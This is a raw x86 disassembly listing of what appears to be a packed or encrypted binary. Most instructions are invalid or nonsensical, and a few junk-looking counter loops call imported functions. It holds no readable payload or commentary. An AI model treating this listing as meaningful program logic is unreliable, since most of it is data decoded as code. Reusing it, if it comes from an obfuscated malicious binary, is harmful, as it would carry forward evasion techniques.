  401886:	mov    ebx,0xdf0466c9
  40188b:	fnstsw WORD PTR [eax+0x7e098f6a]
  401891:	jge    0x40190a
  401893:	aam    0x25
  401895:	adc    DWORD PTR [ebx+0x56],ebp
  401898:	js     0x4018bf
  40189a:	jp     0x40188b
  40189c:	lock fsub DWORD PTR [ebx-0x26efcee2]
  4018a3:	push   ecx
  4018a4:	sbb    DWORD PTR fs:[ebx-0x18],ebx
  4018a8:	add    dh,BYTE PTR [esi+0x70]
  4018ab:	sbb    DWORD PTR [ebx],edi
  4018ad:	jl     0x40184d
  4018af:	sub    DWORD PTR [edx],ebp
  4018b1:	(bad)  
  4018b3:	scas   al,BYTE PTR es:[edi]
  4018b4:	test   DWORD PTR [ecx+0x5c],0x2bd2a5ef
  4018bb:	mov    ah,0x19
  4018bd:	jnp    0x40184b
  4018bf:	sahf   
  4018c0:	gs pop esp
  4018c2:	aaa    
  4018c3:	dec    eax
  4018c4:	sub    BYTE PTR [edx+ebp*2-0x1f51c3b6],bh
  4018cb:	(bad)  
  4018cd:	bound  ebx,QWORD PTR [edi+0x4c95b8c6]
  4018d3:	mov    ecx,0x2b4164ba
  4018d8:	aas    
  4018d9:	mov    cs,eax
  4018db:	call   0x45c24664
  4018e0:	pop    ecx
  4018e1:	xor    eax,0x65dc2951
  4018e6:	mov    ds:0x1db02837,eax
  4018eb:	mov    edi,0x11a24ec1
  4018f0:	dec    edx
  4018f1:	gs imul edx,ebx,0x6c213fbc
  4018f8:	imul   ebp,edi,0xffffffeb
  4018fb:	popf   
  4018fc:	mov    eax,ds:0xdabcc6ca
  401901:	test   edx,0xa88997db
  401907:	sti    
  401908:	jmp    0xd6eb:0xd1e543d5
  40190f:	cmp    ecx,DWORD PTR [ecx+0x2b0cab89]
  401915:	aaa    
  401916:	nop
  401917:	add    DWORD PTR [ebx+0x30d3836e],edx
  40191d:	loop   0x40195c
  40191f:	ins    DWORD PTR es:[edi],dx
  401920:	mov    bl,0x15
  401922:	inc    ebx
  401923:	sub    ch,BYTE PTR [esi-0x67f5eb4]
  401929:	cmc    
  40192a:	xor    esi,esp
  40192c:	fwait
  40192d:	or     eax,0x74111d42
  401933:	repnz and al,0xa1
  401936:	sub    ch,bh
  401938:	dec    esi
  401939:	ret    0xa84b
  40193c:	add    eax,0x4303bbb4
  401941:	stos   BYTE PTR es:[edi],al
  401942:	das    
  401943:	xor    esp,DWORD PTR [edx]
  401945:	out    dx,eax
  401946:	and    al,0x3e
  401948:	ret    0xb416
  40194b:	push   ebp
  40194c:	or     BYTE PTR [edx+eax*1+0x7cfb1ca6],0x99
  401954:	push   ecx
  401955:	push   0xffffff88
  401957:	xchg   ebx,eax
  401958:	dec    ebx
  401959:	shl    eax,0xd1
  40195c:	(bad)
  40195f:	jp     0x4018ee
  401961:	mov    ecx,0xeefdb66d
  401966:	add    eax,0x96d20c49
  40196b:	pop    esi
  40196c:	hlt    
  40196d:	xchg   DWORD PTR [ebp+0x3c],ebp
  401970:	hlt    
  401971:	fwait
  401972:	fs jp  0x4019ab
  401975:	sbb    eax,0xdb0d78e8
  40197a:	les    edx,FWORD PTR ds:0x3413d4f
  401980:	cmp    DWORD PTR [ecx+0x3],eax
  401983:	(bad)  
  401984:	mov    DWORD PTR [ecx],eax
  401986:	sbb    ecx,ecx
  401988:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40198f:	lea    eax,[ebp-0x14]
  401992:	jmp    0x401c31
  401997:	xlat   BYTE PTR ds:[ebx]
  401998:	ret    
  401999:	ds ret 0xc1da
  40199d:	fcmovnu st,st(1)
  40199f:	loope  0x4019b4
  4019a1:	xchg   ch,dh
  4019a3:	and    cl,BYTE PTR [edi-0x71]
  4019a6:	popa   
  4019a7:	add    BYTE PTR [ecx],0x78
  4019aa:	js     0x4019aa
  4019ac:	jle    0x401a26
  4019ae:	js     0x40198e
  4019b0:	in     al,0xd
  4019b2:	retf   
  4019b3:	dec    edx
  4019b4:	or     esp,eax
  4019b6:	cs pop ecx
  4019b8:	cli    
  4019b9:	sahf   
  4019ba:	popa   
  4019bb:	mov    esi,DWORD PTR [edi-0x4b]
  4019be:	jl     0x4019f5
  4019c0:	cmp    BYTE PTR [edi],al
  4019c2:	pushf  
  4019c3:	stos   BYTE PTR es:[edi],al
  4019c4:	add    al,0xab
  4019c6:	arpl   WORD PTR [edx],cx
  4019c8:	push   ds
  4019c9:	ins    BYTE PTR es:[edi],dx
  4019ca:	int    0x6a
  4019cc:	fwait
  4019cd:	or     eax,0x5162f63
  4019d2:	inc    eax
  4019d3:	mul    DWORD PTR [edi-0x59]
  4019d6:	imul   edx,DWORD PTR [ecx-0xbe1d0a9],0x28
  4019dd:	test   eax,0x5822d649
  4019e2:	add    dh,bl
  4019e4:	mov    dh,0xeb
  4019e6:	jnp    0x401993
  4019e8:	sbb    bh,al
  4019ea:	aad    0xcf
  4019ec:	sbb    cl,BYTE PTR [esi]
  4019ee:	outs   dx,DWORD PTR ds:[esi]
  4019ef:	inc    esp
  4019f0:	add    DWORD PTR ds:0x430cae24,ecx
  4019f6:	std    
  4019f7:	adc    BYTE PTR [esi+0x27],0x26
  4019fb:	cmp    DWORD PTR [eax+eiz*8+0x625a10f4],edi
  401a02:	sub    ch,BYTE PTR [di-0x3e]
  401a06:	and    BYTE PTR [edx-0x6e616810],ch
  401a0c:	popf   
  401a0d:	push   0x520df49d
  401a12:	icebp  
  401a13:	in     eax,0x4
  401a15:	rol    BYTE PTR [esi],0xfd
  401a18:	das    
  401a19:	mov    eax,?
  401a1b:	add    bl,BYTE PTR [edx-0xa]
  401a1e:	xchg   BYTE PTR [ecx],cl
  401a20:	mov    ebp,0xf1d95aa4
  401a25:	inc    ebx
  401a26:	out    0x59,eax
  401a28:	outs   dx,DWORD PTR ds:[esi]
  401a29:	xchg   edi,eax
  401a2a:	push   ds
  401a2b:	mov    ah,0x8b
  401a2d:	ror    BYTE PTR [esp+eiz*8+0x7768680c],0x61
  401a35:	pop    ss
  401a36:	dec    edi
  401a37:	mov    esi,0x46860f01
  401a3c:	fnstsw WORD PTR [edx-0xd]
  401a3f:	outs   dx,BYTE PTR ds:[esi]
  401a40:	(bad)  
  401a41:	and    bl,BYTE PTR ds:0x5c306946
  401a47:	inc    ecx
  401a48:	ja     0x401a2d
  401a4a:	dec    ebp
  401a4b:	jg     0x401aa4
  401a4d:	inc    edx
  401a4e:	iret   
  401a4f:	mov    ebx,0xba22ed32
  401a54:	mov    edx,0xd36b92d
  401a59:	jae    0x4019e6
  401a5b:	push   edx
  401a5c:	and    ch,BYTE PTR [esi]
  401a5e:	mov    bl,0x10
  401a60:	jb     0x401aa2
  401a62:	mov    esp,0x54a26b87
  401a67:	(bad)  
  401a68:	inc    DWORD PTR [ebx]
  401a6a:	(bad)  
  401a6c:	or     al,0xbc
  401a6e:	cmp    eax,0xc00df004
  401a73:	mov    al,0xa1
  401a75:	or     DWORD PTR [edi+edx*1-0x53799ffd],edi
  401a7c:	fwait
  401a7d:	arpl   WORD PTR [ebx-0x40718dd2],di
  401a83:	mul    DWORD PTR [edi+0x58]
  401a86:	(bad)  
  401a87:	in     eax,dx
  401a88:	mov    ecx,0x2639c32e
  401a8d:	std    
  401a8e:	mov    al,0xda
  401a90:	and    BYTE PTR [esi*8-0x63487a59],bh
  401a97:	je     0x401a43
  401a99:	loop   0x401aac
  401a9b:	mov    cl,0x5d
  401a9d:	aad    0x8c
  401a9f:	fwait
  401aa0:	lods   eax,DWORD PTR ds:[esi]
  401aa2:	sub    edx,DWORD PTR [eax-0x629d6d23]
  401aa8:	clc    
  401aa9:	popf   
  401aaa:	in     ax,dx
  401aac:	xchg   edx,eax
  401aad:	inc    ebp
  401aae:	cwde   
  401aaf:	adc    DWORD PTR [ebx-0x37],esi
  401ab2:	inc    ebp
  401ab3:	sub    DWORD PTR [edx+0x2c70805c],ebp
  401ab9:	in     al,0xac
  401abb:	and    ebp,DWORD PTR [esi-0x36]
  401abe:	mul    BYTE PTR [esp+edi*8]
  401ac1:	retf   0xc5d8
  401ac4:	dec    esi
  401ac5:	icebp  
  401ac6:	arpl   WORD PTR [bx+si+0x26],ax
  401aca:	mov    al,0xd6
  401acc:	jecxz  0x401b07
  401ace:	xchg   edx,eax
  401acf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ad0:	cmp    eax,0xc16ee175
  401ad5:	or     DWORD PTR [ecx-0x40],0xffffffd0
  401ad9:	fadd   st,st(4)
  401adb:	in     eax,dx
  401adc:	push   ebx
  401add:	cdq    
  401ade:	push   ss
  401adf:	icebp  
  401ae0:	out    dx,al
  401ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ae2:	sbb    BYTE PTR [ebp+eiz*4+0x5fe8d68c],al
  401ae9:	outs   dx,DWORD PTR ds:[esi]
  401aea:	lods   al,BYTE PTR ds:[esi]
  401aeb:	xchg   edi,eax
  401aec:	add    bl,BYTE PTR [ecx+0x44]
  401aef:	inc    edx
  401af0:	jmp    0x401b34
  401af2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401af3:	xor    esp,ebx
  401af5:	mov    ebx,0xcfc0092e
  401afa:	loope  0x401b62
  401afc:	test   al,0x8a
  401afe:	add    BYTE PTR [ebx+0x509486a7],bh
  401b04:	test   BYTE PTR [ebx+0x49],ah
  401b07:	push   edx
  401b08:	mov    al,0xc3
  401b0a:	or     al,0x69
  401b0c:	adc    ch,BYTE PTR [esi]
  401b0e:	in     eax,dx
  401b0f:	mov    eax,ds
  401b11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b12:	pop    esi
  401b13:	adc    ah,BYTE PTR [edx]
  401b15:	retf   
  401b16:	(bad)  
  401b17:	fldenv [edx+0x5a01dd0f]
  401b1d:	push   edx
  401b1e:	js     0x401b5c
  401b20:	and    eax,0xcb245f9e
  401b25:	cmp    eax,0xd1922edf
  401b2a:	int3   
  401b2b:	test   BYTE PTR [eax],ch
  401b2d:	and    ebx,DWORD PTR [ecx]
  401b2f:	or     eax,0x38177087
  401b34:	jmp    0x24c7:0x38532f03
  401b3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b3c:	out    dx,eax
  401b3d:	dec    ebx
  401b3e:	imul   edi,DWORD PTR [edx+0x262a848b],0x67
  401b45:	rcr    eax,cl
  401b47:	mov    eax,ds:0x566ac24c
  401b4c:	retf   
  401b4d:	cmp    edx,DWORD PTR [esi]
  401b4f:	shr    DWORD PTR [ebx+ebp*4-0x3a91e204],0x3c
  401b57:	int3   
  401b58:	gs add esp,0x3b
  401b5c:	add    al,0xb4
  401b5e:	adc    al,0xf7
  401b60:	js     0x401b2b
  401b62:	cmp    dh,ch
  401b64:	repnz fwait
  401b66:	imul   eax,DWORD PTR [ecx+0x2c],0x36ecfa1f
  401b6d:	shl    DWORD PTR [esi],1
  401b6f:	xchg   ebx,eax
  401b70:	push   0xf72c6c31
  401b75:	pusha  
  401b76:	jae    0x401b7c
  401b78:	or     eax,esp
  401b7a:	pushf  
  401b7b:	leave  
  401b7c:	fist   DWORD PTR [edi]
  401b7e:	push   es
  401b7f:	dec    esp
  401b80:	dec    ebp
  401b81:	stc    
  401b82:	add    BYTE PTR [edx],al
  401b84:	xchg   edx,eax
  401b85:	scas   eax,DWORD PTR es:[edi]
  401b86:	xor    DWORD PTR [bp+0x2ddf],edi
  401b8b:	xchg   ebp,edi
  401b8d:	pop    ecx
  401b8e:	mov    eax,0x556c2fa8
  401b93:	adc    DWORD PTR [edi],ebx
  401b95:	xchg   edi,eax
  401b96:	mov    ?,WORD PTR [edx+0x1f]
  401b99:	jbe    0x401bcc
  401b9b:	pushf  
  401b9c:	call   0x2d42d3ae
  401ba1:	aad    0xa4
  401ba3:	mov    ch,BYTE PTR [edx+0x386ee4be]
  401ba9:	add    BYTE PTR [ecx+0x31826cb1],0xf9
  401bb0:	rcr    DWORD PTR [edi+0x37a436ce],cl
  401bb6:	mov    eax,0x11d4f050
  401bbb:	clc    
  401bbc:	xor    al,0x12
  401bbe:	inc    esi
  401bbf:	(bad)  
  401bc1:	mov    cl,BYTE PTR [edx+0x68]
  401bc4:	(bad)  
  401bc5:	fadd   QWORD PTR [edx-0x5e]
  401bc8:	or     BYTE PTR [ecx-0x1fb30800],bl
  401bce:	sub    eax,DWORD PTR [edi]
  401bd0:	mov    cs,ebp
  401bd2:	and    eax,0xd0010c36
  401bd7:	in     al,dx
  401bd8:	and    edx,edx
  401bda:	stos   BYTE PTR es:[edi],al
  401bdb:	jns    0x401b7d
  401bdd:	inc    ebp
  401bde:	and    al,0x30
  401be0:	outs   dx,DWORD PTR ds:[esi]
  401be1:	sub    ebp,DWORD PTR [esi-0x38375654]
  401be7:	sahf   
  401be8:	cmp    DWORD PTR [ebp+ebp*8-0x7ca21df7],edi
  401bef:	loop   0x401bcc
  401bf1:	cdq    
  401bf2:	mov    cl,0xba
  401bf4:	sbb    DWORD PTR [edi+0x3be232ed],ecx
  401bfa:	pushf  
  401bfb:	(bad)  
  401bfc:	js     0x401bcd
  401bfe:	add    esp,esp
  401c00:	xchg   esi,eax
  401c01:	xchg   ebp,eax
  401c02:	sub    edx,ebx
  401c04:	sub    DWORD PTR [ebx+0x7d919156],ecx
  401c0a:	(bad)  
  401c0b:	mov    WORD PTR [edi-0x7053ea],cs
  401c11:	outs   dx,BYTE PTR ds:[esi]
  401c12:	xchg   edx,ebp
  401c14:	adc    dl,BYTE PTR [eax]
  401c16:	pop    esi
  401c17:	fidiv  DWORD PTR [edi]
  401c19:	sub    al,al
  401c1b:	fisttp QWORD PTR [ebx-0x388ed1a4]
  401c21:	sti    
  401c22:	add    bh,BYTE PTR [eax+0x6]
  401c25:	push   0x99837d57
  401c2a:	popw   ss
  401c2c:	scas   al,BYTE PTR es:[edi]
  401c2d:	ins    BYTE PTR es:[edi],dx
  401c2e:	xor    bh,BYTE PTR ds:0xe04589d4
  401c34:	and    DWORD PTR ds:0x42a83d,0x0
  401c3e:	jmp    0x401c4e
  401c43:	mov    eax,ds:0x42a83d
  401c48:	inc    eax
  401c49:	mov    ds:0x42a83d,eax
  401c4e:	cmp    DWORD PTR ds:0x42a83d,0x18
  401c55:	jae    0x401c9b
  401c5b:	cmp    DWORD PTR ds:0x42a83d,0xa
  401c62:	jne    0x401c7b
  401c68:	push   0x6bd9
  401c6d:	push   DWORD PTR [ebp-0x1c]
  401c70:	push   0x42aa2e
  401c75:	call   DWORD PTR ds:0x41d0bc
  401c7b:	cmp    DWORD PTR ds:0x42a83d,0x9
  401c82:	jne    0x401c96
  401c88:	xor    eax,eax
  401c8a:	xor    eax,DWORD PTR ds:0x42a83d
  401c90:	inc    eax
  401c91:	mov    ds:0x42a83d,eax
  401c96:	jmp    0x401c43
  401c9b:	mov    eax,DWORD PTR [ebp-0x14]
  401c9e:	sbb    DWORD PTR ds:0x42a761,0x47a9
  401ca8:	mov    ecx,DWORD PTR [ebp-0x20]
  401cab:	dec    DWORD PTR ds:0x42a775
  401cb1:	xor    eax,esi
  401cb3:	add    eax,edi
  401cb5:	mov    DWORD PTR [ecx],eax
  401cb7:	movzx  eax,WORD PTR ds:0x42a769
  401cbe:	and    eax,DWORD PTR ds:0x42a7b9
  401cc4:	mov    ds:0x42a769,eax
  401cc9:	mov    eax,ds:0x41ebba
  401cce:	mov    ebx,0x8e12febf
  401cd3:	adc    DWORD PTR ds:0x42a7f9,0x42a801
  401cdd:	mov    DWORD PTR [ebp-0xc],ebx
  401ce0:	xor    DWORD PTR ds:0x42a77d,0x1391
  401cea:	mov    eax,DWORD PTR [eax]
  401cec:	mov    cx,WORD PTR [ebp-0x4]
  401cf0:	movzx  ecx,cx
  401cf3:	jmp    0x401f92
  401cf8:	retf   
  401cf9:	iret   
  401cfa:	cmp    al,0x3d
  401cfc:	aam    0xd1
  401cfe:	leave  
  401cff:	fldcw  WORD PTR [edx-0x16]
  401d02:	retf   0xf6ba
  401d05:	neg    DWORD PTR [edi+0x0]
  401d08:	add    BYTE PTR [esi],al
  401d0a:	js     0x401d84
  401d0c:	(bad)  
  401d0d:	jle    0x401d87
  401d0f:	js     0x401d61
  401d11:	jo     0x401cdf
  401d13:	add    DWORD PTR [edi+0x10],ebx
  401d16:	cwde   
  401d17:	push   0xccb71a6f
  401d1c:	retf   
  401d1d:	iret   
  401d1e:	mov    ?,WORD PTR [ecx-0x5f555d0c]
  401d24:	aad    0x50
  401d26:	lock mov ds:0x697501b7,eax
  401d2c:	dec    esp
  401d2d:	popa   
  401d2e:	or     al,0x47
  401d30:	scas   eax,DWORD PTR es:[edi]
  401d31:	fnstenv [ecx+0x6be10fe4]
  401d37:	push   es
  401d38:	cmp    cl,BYTE PTR [eax]
  401d3a:	fidivr WORD PTR [esi-0x65]
  401d3d:	bnd jno 0x401d31
  401d40:	inc    edi
  401d41:	popf   
  401d42:	rcl    BYTE PTR [ecx-0x3e1b3b76],cl
  401d48:	or     bl,dh
  401d4a:	call   esp
  401d4c:	add    ah,BYTE PTR [ebx]
  401d4e:	ins    BYTE PTR es:[edi],dx
  401d4f:	xchg   esi,eax
  401d50:	retf   
  401d51:	mov    ds:0xe4a13079,al
  401d56:	in     eax,0x7c
  401d58:	jo     0x401db2
  401d5a:	fist   DWORD PTR [edx-0x6e]
  401d5d:	cmp    BYTE PTR [edi-0x67],ch
  401d60:	xchg   DWORD PTR ds:0x1d46273c,eax
  401d66:	and    dl,BYTE PTR [eax]
  401d68:	pushf  
  401d69:	hlt    
  401d6a:	sti    
  401d6b:	pop    eax
  401d6c:	fild   QWORD PTR [ecx]
  401d6e:	call   0x40ce:0xc50daf2b
  401d75:	cs icebp 
  401d77:	dec    esp
  401d78:	or     DWORD PTR [esi+0x4a],esp
  401d7b:	and    bh,BYTE PTR [ebx*1-0x40b4c194]
  401d82:	aas    
  401d83:	test   DWORD PTR [esi-0x11],edi
  401d86:	in     eax,0xe8
  401d88:	rcl    DWORD PTR [eax-0x1b],1
  401d8b:	xor    al,0x79
  401d8d:	add    DWORD PTR ds:0x21eea45d,0x775980ae
  401d97:	mov    edx,0x903d0a49
  401d9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d9d:	pop    esi
  401d9e:	je     0x401d65
  401da0:	repz mov esi,0x741941b6
  401da6:	push   ss
  401da7:	call   0x1529af01
  401dac:	iret   
  401dad:	fmulp  st(7),st
  401daf:	imul   ebx,DWORD PTR [ecx],0x207927a5
  401db5:	xor    ah,bh
  401db7:	mov    DWORD PTR [ebx],ebx
  401db9:	loope  0x401dc1
  401dbb:	inc    ebx
  401dbc:	bound  edi,QWORD PTR [eax-0x3e]
  401dbf:	js     0x401d60
  401dc1:	and    al,0x20
  401dc3:	(bad)  
  401dc5:	push   cs
  401dc6:	lods   al,BYTE PTR ds:[esi]
  401dc7:	push   DWORD PTR [ecx]
  401dc9:	adc    BYTE PTR [ebx],cl
  401dcb:	pop    esp
  401dcc:	shl    BYTE PTR [ecx+0x398da9aa],0xb6
  401dd3:	into   
  401dd4:	or     edi,DWORD PTR [eax-0x7411e155]
  401dda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ddb:	and    al,BYTE PTR [edx+0x24]
  401dde:	add    al,0xc7
  401de0:	mov    esi,0x50f69a33
  401de5:	out    dx,eax
  401de6:	sub    DWORD PTR [eax+edi*8],0xe288df0d
  401ded:	xor    DWORD PTR [esi],edi
  401def:	into   
  401df0:	or     ch,ch
  401df2:	xchg   bh,al
  401df4:	aaa    
  401df5:	adc    bh,BYTE PTR [edi]
  401df7:	(bad)  
  401df8:	(bad)  
  401dfa:	cmp    esi,esi
  401dfc:	cwde   
  401dfd:	hlt    
  401dfe:	ret    0x33c3
  401e01:	lock or bh,BYTE PTR [edx-0x5225e977]
  401e08:	mov    eax,ds:0xda72aba9
  401e0d:	add    al,0xfa
  401e0f:	call   0x69dc:0xd6313ceb
  401e16:	mov    BYTE PTR [ebx],0x1f
  401e19:	sub    dh,cl
  401e1b:	sub    eax,0xc349ea0f
  401e20:	and    DWORD PTR [ecx],eax
  401e22:	aas    
  401e23:	adc    DWORD PTR [ebx],0x4b778d66
  401e29:	jno    0x401dac
  401e2b:	inc    ebp
  401e2c:	sub    edx,ecx
  401e2e:	inc    ecx
  401e2f:	sub    esi,ebp
  401e31:	stc    
  401e32:	mov    eax,0x9b485cee
  401e37:	cmp    al,BYTE PTR [ecx+0x8cbbf91]
  401e3d:	scas   eax,DWORD PTR es:[edi]
  401e3e:	fimul  WORD PTR [eax-0x37b4d39e]
  401e44:	imul   edx,edx,0xf963c894
  401e4a:	ins    DWORD PTR es:[edi],dx
  401e4b:	ret    0x4bf3
  401e4e:	popf   
  401e4f:	adc    DWORD PTR [ebp-0x37],eax
  401e52:	mov    ecx,0xe3e99897
  401e57:	jl     0xba6f18ff
  401e5d:	sub    eax,0xdd893456
  401e62:	sbb    BYTE PTR [esi+ecx*2+0x42],0x88
  401e67:	and    edi,DWORD PTR [edx-0x593e0841]
  401e6d:	cmp    al,0x90
  401e6f:	sub    al,0x1a
  401e71:	xchg   ebp,eax
  401e72:	cmp    DWORD PTR ds:0xf82c2a8c,esi
  401e78:	mov    ch,0x0
  401e7a:	pop    ds
  401e7b:	pop    es
  401e7c:	sti    
  401e7d:	xchg   ebx,eax
  401e7e:	sti    
  401e7f:	sub    edx,DWORD PTR [edi-0x47]
  401e82:	cmp    eax,0x873ac9ad
  401e87:	ret    0xc40d
  401e8a:	push   cs
  401e8b:	jl     0x401f0b
  401e8d:	loop   0x401ef2
  401e8f:	mov    eax,ds:0xca74335c
  401e94:	mov    ds:0x2bf38ee9,al
  401e99:	adc    cl,BYTE PTR [edi]
  401e9b:	stc    
  401e9c:	add    eax,0xaa91eb10
  401ea1:	pusha  
  401ea2:	nop
  401ea3:	loopne 0x401eb1
  401ea5:	mov    ch,0xbf
  401ea7:	inc    edi
  401ea8:	push   ebp
  401ea9:	shl    BYTE PTR [eax],cl
  401eab:	mov    dh,0x7d
  401ead:	and    al,0x22
  401eaf:	jne    0x401f07
  401eb1:	in     al,0xff
  401eb3:	int3   
  401eb4:	mov    ecx,DWORD PTR ds:0x51c09f52
  401eba:	jl     0x401e72
  401ebc:	push   ebx
  401ebd:	mov    edx,0x1bc9854b
  401ec2:	sbb    eax,0xe3211448
  401ec7:	mov    ecx,fs
  401ec9:	xchg   esi,eax
  401eca:	cmp    ah,BYTE PTR [ebp+edi*2+0x363261f9]
  401ed1:	push   eax
  401ed2:	popa   
  401ed3:	mov    ebx,0x91de1f99
  401ed8:	pop    ebp
  401ed9:	dec    edx
  401eda:	pop    ss
  401edb:	mov    edi,0xd066bc0
  401ee0:	xchg   BYTE PTR [ebx],al
  401ee2:	scas   eax,DWORD PTR es:[edi]
  401ee3:	xchg   edi,eax
  401ee4:	imul   al
  401ee6:	inc    edx
  401ee7:	sahf   
  401ee8:	jmp    0xb9d1d12d
  401eed:	xchg   ebp,eax
  401eee:	aad    0x5f
  401ef0:	mov    DWORD PTR [edi-0x7a],edx
  401ef3:	jmp    0xeb2f8611
  401ef8:	lods   eax,DWORD PTR ds:[esi]
  401ef9:	jns    0x401f27
  401efb:	xor    eax,0x4c5e98cf
  401f00:	jns    0x401ef6
  401f02:	dec    ecx
  401f03:	sbb    DWORD PTR [eax],0xa8846d0a
  401f09:	stos   BYTE PTR es:[edi],al
  401f0a:	push   ds
  401f0b:	outs   dx,BYTE PTR ds:[esi]
  401f0c:	(bad)  
  401f0d:	cmp    DWORD PTR [esi],0xffffffb2
  401f10:	(bad)  
  401f11:	in     al,0x28
  401f13:	pop    edi
  401f14:	rcl    BYTE PTR [edx-0x250136bf],cl
  401f1a:	ins    DWORD PTR es:[edi],dx
  401f1b:	es out dx,eax
  401f1d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  401f1f:	mov    eax,0x9d17664f
  401f24:	out    dx,eax
  401f25:	pop    ebp
  401f26:	pop    edi
  401f27:	shl    ch,cl
  401f29:	dec    esi
  401f2a:	inc    esi
  401f2b:	mov    bl,0x44
  401f2d:	push   edi
  401f2e:	push   ebp
  401f2f:	push   cs
  401f30:	aad    0x81
  401f32:	or     BYTE PTR [eax],bh
  401f34:	in     al,dx
  401f35:	dec    edx
  401f36:	sahf   
  401f37:	ja     0x401ebc
  401f39:	and    BYTE PTR [esi+0x1cc19af8],bl
  401f3f:	and    ebp,DWORD PTR [ebx+ebx*4-0x57]
  401f43:	sub    BYTE PTR [ecx],bh
  401f45:	mov    edi,ebp
  401f47:	je     0x401f44
  401f49:	dec    esp
  401f4a:	cld    
  401f4b:	adc    eax,0x8406123b
  401f50:	xlat   BYTE PTR ds:[ebx]
  401f51:	push   ecx
  401f52:	mov    dh,0x1d
  401f54:	and    al,0x9e
  401f56:	cmp    eax,0xe8c240fc
  401f5b:	adc    ah,BYTE PTR [eax+edi*2]
  401f5e:	les    edi,FWORD PTR [edi*4-0x52062141]
  401f65:	leave  
  401f66:	adc    ebp,DWORD PTR ds:0x60262eb6
  401f6c:	addr16 cmp al,0x9e
  401f6f:	sbb    BYTE PTR [edi-0x78],0xbd
  401f73:	mov    al,0x19
  401f75:	mov    ebx,DWORD PTR [esp+0x1e796075]
  401f7c:	add    DWORD PTR [ebx+0x7f],0xcb950d48
  401f83:	leave  
  401f84:	std    
  401f85:	fild   QWORD PTR [ebx+0x1e6cac18]
  401f8b:	lods   al,BYTE PTR gs:[esi]
  401f8d:	cmp    bl,BYTE PTR [ebx-0x3f]
  401f90:	push   ss
  401f91:	adc    BYTE PTR [ebx],al
  401f93:	or     BYTE PTR [ebx],dh
  401f95:	rol    BYTE PTR [ebx],0x5
  401f98:	cmp    DWORD PTR [eax+0x5230042],ebp
  401f9e:	mov    DWORD PTR [eax+0x39a30042],ebp
  401fa4:	test   al,0x42
  401fa6:	add    BYTE PTR [ecx+0x581e84d],cl
  401fac:	icebp  
  401fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fae:	inc    edx
  401faf:	add    BYTE PTR [eax-0x74fffffb],bl
  401fb5:	inc    ebp
  401fb6:	or     BYTE PTR [ecx+0x42a75925],al
  401fbc:	add    BYTE PTR [eax],al
  401fbe:	add    BYTE PTR [eax],al
  401fc0:	add    cl,ch
  401fc2:	or     eax,0x8b000000
  401fc7:	or     eax,0x42a759
  401fcc:	inc    ecx
  401fcd:	mov    DWORD PTR ds:0x42a759,ecx
  401fd3:	cmp    DWORD PTR ds:0x42a759,0x11
  401fda:	jae    0x402003
  401fe0:	cmp    DWORD PTR ds:0x42a759,0x1b
  401fe7:	jne    0x401ffe
  401fed:	push   0x275b
  401ff2:	push   DWORD PTR [ebp-0x20]
  401ff5:	push   DWORD PTR [ebp-0x28]
  401ff8:	call   DWORD PTR ds:0x41d184
  401ffe:	jmp    0x401fc6
  402003:	mov    ecx,DWORD PTR [ebp-0x8]
  402006:	jmp    0x4022a5
  40200b:	rcl    cl,0xcf
  40200e:	ret    
  40200f:	fld    st(1)
  402011:	aam    0xd9
  402013:	push   ecx
  402014:	shl    bh,1
  402016:	cmp    DWORD PTR [edx-0x79a708bb],edi
  40201c:	add    al,0x78
  40201e:	js     0x40201e
  402020:	jle    0x40209a
  402022:	js     0x402069
  402024:	scas   al,BYTE PTR es:[edi]
  402025:	fstp   QWORD PTR [ecx+0x47]
  402028:	inc    edi
  402029:	inc    esp
  40202a:	adc    ecx,DWORD PTR [edx+0x46]
  40202d:	neg    BYTE PTR [eax]
  40202f:	jns    0x402018
  402031:	pop    ebx
  402032:	mov    ds:0x5f139194,al
  402037:	mov    edx,0x87b9dc20
  40203c:	loop   0x402029
  40203e:	ss push es
  402040:	push   edi
  402041:	out    dx,al
  402042:	or     al,0xb3
  402044:	push   ebp
  402045:	xor    esp,DWORD PTR [edx]
  402047:	xchg   esp,eax
  402048:	cli    
  402049:	in     al,dx
  40204a:	aas    
  40204b:	xchg   edx,eax
  40204c:	xchg   esp,eax
  40204d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40204e:	dec    BYTE PTR [ebx-0x28af4130]
  402054:	test   DWORD PTR [ecx],edx
  402056:	xchg   BYTE PTR [ebx-0x44d3d9d0],ah
  40205c:	(bad)  [ecx]
  40205e:	jg     0x402042
  402060:	ds push ecx
  402062:	gs icebp 
  402064:	test   al,0xf7
  402066:	inc    ebp
  402067:	xchg   esi,eax
  402068:	cwde   
  402069:	lock (bad) 
  40206b:	test   DWORD PTR [ebx-0x4f3a2f1a],esi
  402071:	(bad)  
  402072:	leave  
  402073:	inc    esp
  402074:	push   ds
  402075:	adc    BYTE PTR [esi+0x76ab5f29],0x13
  40207c:	mov    eax,ds:0x3a6190c
  402081:	add    DWORD PTR [ecx-0x7b29c697],ebx
  402087:	jg     0x4020ff
  402089:	push   es
  40208a:	or     eax,0x28c6974d
  40208f:	jns    0x4020bb
  402091:	jns    0x4020ef
  402093:	lock inc ebx
  402095:	pop    esi
  402096:	xchg   ebx,eax
  402097:	sbb    BYTE PTR [eax+0x44],al
  40209a:	jae    0x402040
  40209c:	sbb    cl,BYTE PTR [eax+ecx*1+0x19]
  4020a0:	ss ds cld 
  4020a3:	and    edi,DWORD PTR [edi+0x70ac3e0c]
  4020a9:	cmp    ecx,DWORD PTR [edx]
  4020ab:	out    dx,eax
  4020ac:	rcr    BYTE PTR [edx],0x85
  4020af:	ret    0x955b
  4020b2:	cmp    edi,DWORD PTR [eax-0x53]
  4020b5:	pop    ebp
  4020b6:	cld    
  4020b7:	mov    ebp,0x3b211306
  4020bc:	in     eax,dx
  4020bd:	retf   0x28d
  4020c0:	mov    dl,0xe6
  4020c2:	jp     0x402082
  4020c4:	push   edi
